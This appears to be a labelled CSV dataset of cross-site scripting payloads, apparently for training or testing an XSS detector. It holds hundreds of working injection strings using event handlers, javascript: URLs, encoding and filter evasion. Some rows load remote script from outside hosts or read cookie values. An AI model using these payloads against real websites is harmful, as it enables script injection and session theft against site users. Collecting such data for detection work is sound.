payload,label
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,1
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",1
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",1
&#000060,1
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",1
"<script onmouseover=""alert(1)"">test</script>",1
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",1
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",1
"<figure onbeforecopy=""alert(1)"" contenteditable>test</figure>",1
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",1
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",1
"<noframes onmouseup=""alert(1)"">test</noframes>",1
<time id=x tabindex=1 onfocusin=alert(1)></time>,1
"<noframes draggable=""true"" ondragenter=""alert(1)"">test</noframes>",1
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",1
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",1
"<p draggable=""true"" ondragleave=""alert(1)"">test</p>",1
"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",1
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",1
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",1
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></script>",1
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",1
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>",1
"<font onmouseover=""alert(1)"">test</font>",1
"<noscript onkeypress=""alert(1)"" contenteditable>test</noscript>",1
"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></footer>",1
"<legend onmouseover=""alert(1)"">test</legend>",1
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>",1
<svg><thead onload=alert(1)></thead>,1
"<strike onbeforepaste=""alert(1)"" contenteditable>test</strike>",1
<svg><font onload=alert(1)></font>,1
"<option onkeyup=""alert(1)"" contenteditable>test</option>",1
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationstart=""alert(1)""></bdo>",1
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meta>",1
"<audio onmousedown=""alert(1)"">test</audio>",1
"<tfoot onkeyup=""alert(1)"" contenteditable>test</tfoot>",1
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",1
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",1
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",1
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",1
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1
"<dfn oncopy=""alert(1)"" contenteditable>test</dfn>",1
"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",1
<output id=x tabindex=1 onfocusin=alert(1)></output>,1
"""`'><script>\x09javascript:alert(1)</script>",1
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",1
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",1
<h1 id=x tabindex=1 onfocusin=alert(1)></h1>,1
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,1
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,1
&#x003C,1
"exp/*<A STYLE='no\xss:noxss(""*//*"");",1
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",1
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",1
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",1
"\"";;alert(';XSS';);//",1
"<;IMG SRC="";livescript:[code]"";>;",1
"<hgroup draggable=""true"" ondragleave=""alert(1)"">test</hgroup>",1
"<head onmouseenter=""alert(1)"">test</head>",1
x”</title><img src%3dx onerror%3dalert(1)>,1
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,1
"<head onkeydown=""alert(1)"" contenteditable>test</head>",1
"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",1
"<nav onmouseup=""alert(1)"">test</nav>",1
"<ol onclick=""alert(1)"">test</ol>",1
"<keygen ondblclick=""alert(1)"">test</keygen>",1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
"<figcaption onmousemove=""alert(1)"">test</figcaption>",1
"<canvas oncopy=""alert(1)"" contenteditable>test</canvas>",1
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",1
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,1
"<multicol onmouseup=""alert(1)"">test</multicol>",1
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out,1
"<col onkeypress=""alert(1)"" contenteditable>test</col>",1
"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",1
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,1
"<nobr draggable=""true"" ondragend=""alert(1)"">test</nobr>",1
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",1
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",1
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<time onmouseout=""alert(1)"">test</time>",1
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,1
<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>,1
<x contenteditable onpaste=alert(1)>paste here!,1
<svg><acronym onload=alert(1)></acronym>,1
<svg><frameset onload=alert(1)></frameset>,1
<http://onxxx%3D1/,1
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>",1
"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",1
"<area onmouseup=""alert(1)"">test</area>",1
"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",1
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",1
"<section onmouseover=""alert(1)"">test</section>",1
"<hr onkeyup=""alert(1)"" contenteditable>test</hr>",1
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",1
"<IMG DYNSRC=\""javascript:alert('XSS')\"">",1
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",1
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",1
"<body onpaste=""alert(1)"" contenteditable>test</body>",1
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1
"<marquee onbeforecopy=""alert(1)"" contenteditable>test</marquee>",1
"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",1
"<q draggable=""true"" ondrag=""alert(1)"">test</q>",1
"<big onmousemove=""alert(1)"">test</big>",1
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",1
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",1
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",1
"<nextid onclick=""alert(1)"">test</nextid>",1
<u id=x tabindex=1 onfocus=alert(1)></u>,1
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",1
"<small onmouseup=""alert(1)"">test</small>",1
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
"<thead onmousedown=""alert(1)"">test</thead>",1
"<select onmousemove=""alert(1)"">test</select>",1
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1
"<blockquote onclick=""alert(1)"">test</blockquote>",1
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",1
<script>({0:#0=alert/#0#/#0#(123)})</script>,1
"<samp oncut=""alert(1)"" contenteditable>test</samp>",1
<BODY ONLOAD=alert('XSS')>,1
"<map draggable=""true"" ondragleave=""alert(1)"">test</map>",1
"<output onmousedown=""alert(1)"">test</output>",1
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",1
&#X00003c,1
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",1
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",1
"<basefont onclick=""alert(1)"">test</basefont>",1
"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",1
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",1
"<style>@keyframes slidein {}</style><aside style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></aside>",1
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationend=""alert(1)""></noframes>",1
<svg><param onload=alert(1)></param>,1
<style><!--</style><script>document.vulnerable=true;//--></script>,1
"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>",1
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",1
<img id=x tabindex=1 onbeforeactivate=alert(1)></img>,1
"<style>:target {transform: rotate(180deg);}</style><video id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></video>",1
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",1
"<figure onmouseover=""alert(1)"">test</figure>",1
"<marquee onclick=""alert(1)"">test</marquee>",1
<svg><del onload=alert(1)></del>,1
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",1
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",1
"<button oncut=""alert(1)"" contenteditable>test</button>",1
<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>,1
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,1
"<iframe onmouseup=""alert(1)"">test</iframe>",1
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",1
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1
"<legend onbeforepaste=""alert(1)"" contenteditable>test</legend>",1
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,1
*/</script>'>alert(1)/*<script/1=',1
<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>,1
"<noscript onmousemove=""alert(1)"">test</noscript>",1
"<button draggable=""true"" ondragenter=""alert(1)"">test</button>",1
"<script onmouseenter=""alert(1)"">test</script>",1
"<meta draggable=""true"" ondragenter=""alert(1)"">test</meta>",1
"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",1
"<head ondblclick=""alert(1)"">test</head>",1
<em id=x tabindex=1 onbeforeactivate=alert(1)></em>,1
"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>",1
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,1
"<data onmouseleave=""alert(1)"">test</data>",1
"<del onmousedown=""alert(1)"">test</del>",1
<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>,1
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",1
"<rtc draggable=""true"" ondragend=""alert(1)"">test</rtc>",1
<scrscriptipt>alert(1)</scrscriptipt>,1
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",1
"<source onmouseout=""alert(1)"">test</source>",1
<a href=javascript:alert(1)>click,1
"<tr draggable=""true"" ondragstart=""alert(1)"">test</tr>",1
"<aside onmouseout=""alert(1)"">test</aside>",1
<input onfocus=javascript:alert(1) autofocus>,1
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",1
<video src=1 onerror=alert(1)>,1
"<multicol onkeyup=""alert(1)"" contenteditable>test</multicol>",1
<param id=x tabindex=1 onbeforeactivate=alert(1)></param>,1
"<legend onmouseup=""alert(1)"">test</legend>",1
"<video onmouseenter=""alert(1)"">test</video>",1
<code id=x tabindex=1 onfocusin=alert(1)></code>,1
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noscript>",1
"<details oncut=""alert(1)"" contenteditable>test</details>",1
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,1
"<tr onmousedown=""alert(1)"">test</tr>",1
"<datalist onmouseover=""alert(1)"">test</datalist>",1
"<listing onkeydown=""alert(1)"" contenteditable>test</listing>",1
"<code oncopy=""alert(1)"" contenteditable>test</code>",1
&#X000003C,1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
<map onfocusout=alert(1) tabindex=1 id=x></map><input autofocus>,1
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",1
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,1
"<content onkeydown=""alert(1)"" contenteditable>test</content>",1
"<area onmousedown=""alert(1)"">test</area>",1
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",1
<embed src=1 onerror=alert(1) type=image/gif>,1
&#X03C,1
"<body onkeydown=""alert(1)"" contenteditable>test</body>",1
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",1
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>,1
<IMG SRC=”jav ascript:alert(‘XSS’);”>,1
"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",1
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",1
"<header onkeyup=""alert(1)"" contenteditable>test</header>",1
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",1
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",1
"<title oncopy=""alert(1)"" contenteditable>test</title>",1
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>",1
"<big oncut=""alert(1)"" contenteditable>test</big>",1
"<menuitem onmousedown=""alert(1)"">test</menuitem>",1
"<form onkeydown=""alert(1)"" contenteditable>test</form>",1
"<listing onclick=""alert(1)"">test</listing>",1
"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",1
<svg id=x onfocusin=alert(1)>,1
"<header draggable=""true"" ondrag=""alert(1)"">test</header>",1
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",1
"<td onkeypress=""alert(1)"" contenteditable>test</td>",1
<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>,1
"<ol draggable=""true"" ondragstart=""alert(1)"">test</ol>",1
"<section onpaste=""alert(1)"" contenteditable>test</section>",1
<textarea onpaste=alert(1) autofocus></textarea>,1
<body onload=alert(1)>,1
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",1
"'';!--""<XSS>=&{()}",1
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",1
